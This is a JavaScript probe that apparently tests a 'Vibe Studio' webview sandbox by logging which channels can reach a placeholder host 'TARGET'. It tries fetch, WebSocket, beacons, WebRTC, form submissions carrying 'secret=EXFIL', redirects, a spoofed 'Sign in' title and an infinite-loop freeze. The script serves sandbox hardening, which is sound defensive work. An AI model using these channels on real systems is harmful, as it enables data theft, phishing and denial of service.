window.__p=1;__spike.log({v:"alive"});(async () => {
const T = 'TARGET', H = 'http://' + T;
const g = document.body.dataset.group;
const log = (v, r) => __spike.log({ v, r: String(r) });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
log('env', JSON.stringify({ g, origin: location.origin, rtc: typeof RTCPeerConnection, wrtc: typeof webkitRTCPeerConnection, md: typeof (navigator.mediaDevices), rtcdc: typeof RTCDataChannel, names: Object.getOwnPropertyNames(window).filter((n) => /RTC|MediaStream|MediaRecorder/.test(n)).join(','), ws: typeof WebSocket, es: typeof EventSource,
  inline: window.__inline === 1, onerror: window.__onerror === 1, handler: typeof (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.vibe) }));
try { const r = await window.vibe.run('by_region', { from: '2026-01-01' }); log('vibe.run', JSON.stringify(r)); } catch (e) { log('vibe.run', 'ERR ' + e); }

if (g === 'main') {
  const tryit = async (v, f) => { try { const r = await f(); log(v, 'ok ' + r); } catch (e) { log(v, 'rejected ' + e); } };
  await tryit('fetch', async () => (await fetch(H + '/v/fetch')).status);
  await tryit('fetch-nocors', async () => (await fetch(H + '/v/fetch-nocors', { mode: 'no-cors' })).type);
  await tryit('fetch-self-asset', async () => (await fetch('/assets/x.json')).status);
  await tryit('fetch-dnsname', async () => (await fetch('http://fetch-name.DNSSUF:' + T.split(':')[1] + '/v/dns-fetch', { mode: 'no-cors' })).type);
  await tryit('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', H + '/v/xhr'); x.onload = () => res(x.status); x.onerror = () => rej('xhr error'); x.send(); }));
  try { const w = new WebSocket('ws://' + T + '/v/ws'); w.onerror = () => log('ws', 'error'); w.onopen = () => log('ws', 'open'); w.onclose = () => log('ws', 'close'); } catch (e) { log('ws', 'ctor-throw ' + e); }
  try { const es = new EventSource(H + '/v/eventsource'); es.onerror = () => { log('eventsource', 'error'); es.close(); }; } catch (e) { log('eventsource', 'ctor-throw ' + e); }
  try { log('beacon', navigator.sendBeacon(H + '/v/beacon', 'x')); } catch (e) { log('beacon', 'throw ' + e); }
  new Image().src = H + '/v/img';
  const imgn = new Image(); imgn.src = 'http://img-name.DNSSUF:' + T.split(':')[1] + '/v/dns-img';
  const add = (tag, attrs) => { const e = document.createElement(tag); for (const k in attrs) e.setAttribute(k, attrs[k]); document.head.appendChild(e); return e; };
  add('link', { rel: 'dns-prefetch', href: 'http://pf-dns.DNSSUF:' + T.split(':')[1] + '/' });
  add('link', { rel: 'preconnect', href: H });
  add('link', { rel: 'preconnect', href: 'http://pc-name.DNSSUF:' + T.split(':')[1] });
  add('link', { rel: 'prefetch', href: H + '/v/prefetch' });
  add('link', { rel: 'preload', as: 'fetch', href: H + '/v/preload' });
  add('link', { rel: 'prerender', href: H + '/v/prerender' });
  add('link', { rel: 'stylesheet', href: H + '/v/link-css.css' });
  const a = document.createElement('a'); a.href = '#frag'; a.setAttribute('ping', H + '/v/ping'); a.textContent = 'x'; document.body.appendChild(a); a.click();
  const sc = document.createElement('script'); sc.src = H + '/v/script.js'; document.body.appendChild(sc);
  const lnk = document.createElement('link'); lnk.rel = 'icon'; lnk.href = H + '/v/icon'; document.head.appendChild(lnk);
  if (typeof RTCPeerConnection !== 'undefined') {
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + T }] });
      pc.createDataChannel('x');
      pc.onicecandidate = (e) => log('webrtc-candidate', e.candidate ? e.candidate.candidate : 'end');
      await pc.setLocalDescription(await pc.createOffer());
      log('webrtc', 'offer set');
    } catch (e) { log('webrtc', 'throw ' + e); }
  } else { log('webrtc', 'RTCPeerConnection undefined'); }
  try { const gm = await navigator.mediaDevices.getUserMedia({ audio: true }); log('getUserMedia', 'granted'); } catch (e) { log('getUserMedia', 'rejected ' + e); }
  try { const r = await Notification.requestPermission(); log('notification', r); } catch (e) { log('notification', 'throw ' + e); }
  try { navigator.geolocation.getCurrentPosition((p) => log('geolocation', 'granted'), (e) => log('geolocation', 'denied ' + e.code)); } catch (e) { log('geolocation', 'throw ' + e); }
  await sleep(4000);
  log('main', 'done');
} else if (g === 'open') {
  const w = window.open(H + '/v/window-open'); log('window.open', w === null ? 'null' : 'window');
  await sleep(2000); log('open', 'done');
} else if (g === 'form') {
  const f = document.createElement('form'); f.action = H + '/v/form'; f.method = 'POST'; const i = document.createElement('input'); i.name = 'secret'; i.value = 'EXFIL'; f.appendChild(i); document.body.appendChild(f);
  log('form', 'submitting'); f.submit(); await sleep(2000); log('form', 'still here after submit');
} else if (g === 'formget') {
  const f = document.createElement('form'); f.action = H + '/v/formget'; f.method = 'GET'; const i = document.createElement('input'); i.name = 'secret'; i.value = 'EXFIL'; f.appendChild(i); document.body.appendChild(f);
  log('formget', 'submitting'); f.submit(); await sleep(2000); log('formget', 'still here after submit');
} else if (g === 'loc') {
  log('loc', 'assigning'); location = H + '/v/location?secret=EXFIL'; await sleep(2000); log('loc', 'still here');
} else if (g === 'locreplace') {
  log('locreplace', 'assigning'); location.replace(H + '/v/locreplace'); await sleep(2000); log('locreplace', 'still here');
} else if (g === 'alink') {
  const a = document.createElement('a'); a.href = H + '/v/alink'; a.textContent = 'x'; document.body.appendChild(a); log('alink', 'click'); a.click(); await sleep(2000); log('alink', 'still here');
} else if (g === 'alinkname') {
  const a = document.createElement('a'); a.href = 'http://alink-name.DNSSUF:' + T.split(':')[1] + '/v/alinkname'; a.textContent = 'x'; document.body.appendChild(a); log('alinkname', 'click'); a.click(); await sleep(2500); log('alinkname', 'still here');
} else if (g === 'metarefresh') {
  const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + H + '/v/metarefresh'; document.head.appendChild(m); await sleep(2500); log('metarefresh', 'still here');
} else if (g === 'selfnav') {
  const a = document.createElement('a'); a.href = 'vibe-page://app/other?x=1'; document.body.appendChild(a); log('selfnav', 'click other path'); a.click(); await sleep(1500);
  const b = document.createElement('a'); b.href = '?g=samepage'; document.body.appendChild(b); log('samepage-link', 'click'); b.click(); await sleep(1500); log('selfnav', 'done');
} else if (g === 'samepage') {
  log('samepage', 'arrived'); await sleep(500);
} else if (g === 'frame') {
  const f1 = document.createElement('iframe'); f1.srcdoc = '<script>try{window.webkit.messageHandlers.vibe.postMessage(JSON.stringify({t:"log",o:{v:"frame-post",r:"posted-from-srcdoc"}}))}catch(e){}<\/script>';
  document.body.appendChild(f1);
  const f2 = document.createElement('iframe'); f2.src = '/frame.html'; document.body.appendChild(f2);
  await sleep(2500); log('frame', 'done');
} else if (g === 'freeze') {
  await sleep(1500); log('freeze', 'entering while(true)'); while (true) {}
} else if (g === 'title') {
  document.title = 'Vibe Studio - Sign in'; await sleep(1000); log('title', 'set document.title=' + document.title);
} else if (g === 'storage') {
  const prev = { ls: null, ck: document.cookie };
  try { prev.ls = localStorage.getItem('k'); localStorage.setItem('k', 'v1'); } catch (e) { prev.ls = 'throw ' + e; }
  try { document.cookie = 'c=1; path=/'; } catch (e) {}
  let idb = 'n/a'; try { idb = await new Promise((res) => { const r = indexedDB.open('spike'); r.onsuccess = () => { const db = r.result; res('opened v' + db.version); db.close(); }; r.onerror = () => res('idb error'); }); } catch (e) { idb = 'throw ' + e; }
  log('storage', JSON.stringify({ prevLocalStorage: prev.ls, prevCookie: prev.ck, idb }));
} else if (g === 'charts') {
  const out = document.getElementById('out');
  const load = (src) => new Promise((res, rej) => { const s = document.createElement('script'); s.src = src; s.onload = res; s.onerror = () => rej('load ' + src); document.head.appendChild(s); });
  try {
    for (const f of ['d3-array', 'd3-color', 'd3-interpolate', 'd3-format', 'd3-time', 'd3-time-format', 'd3-scale', 'd3-path', 'd3-shape']) await load('/libs/' + f + '.js');
    const data = [3, 7, 2, 9, 5];
    const x = d3.scaleLinear().domain([0, 4]).range([10, 290]), y = d3.scaleLinear().domain([0, 10]).range([110, 10]);
    const d = d3.line().x((v, i) => x(i)).y((v) => y(v))(data);
    out.insertAdjacentHTML('beforeend', '<svg id="d3svg" width="300" height="120"><path d="' + d + '" fill="none" stroke="black"/></svg>');
    log('d3', 'rendered path length ' + document.querySelector('#d3svg path').getAttribute('d').length);
  } catch (e) { log('d3', 'FAIL ' + e); }
  try {
    for (const f of ['vega', 'vega-interpreter', 'vega-lite']) await load('/libs/' + f + '.js');
    if (window.vega && window.vegaInterpreter && !window.vega.expressionInterpreter) window.vega.expressionInterpreter = window.vegaInterpreter.expressionInterpreter;
    const vl = { data: { values: [{ a: 'A', b: 28 }, { a: 'B', b: 55 }, { a: 'C', b: 43 }] }, mark: 'bar', encoding: { x: { field: 'a', type: 'nominal' }, y: { field: 'b', type: 'quantitative' } } };
    const spec = vegaLite.compile(vl).spec;
    const view = new vega.View(vega.parse(spec, null, { ast: true }), { expr: vega.expressionInterpreter, renderer: 'none' });
    const svg = await view.toSVG();
    out.insertAdjacentHTML('beforeend', svg);
    log('vega-lite', 'rendered svg bytes ' + svg.length + ' rects ' + out.querySelectorAll('rect,path').length);
  } catch (e) { log('vega-lite', 'FAIL ' + e + ' ' + (e && e.stack || '')); }
  await sleep(500); log('charts', 'done');
}
})();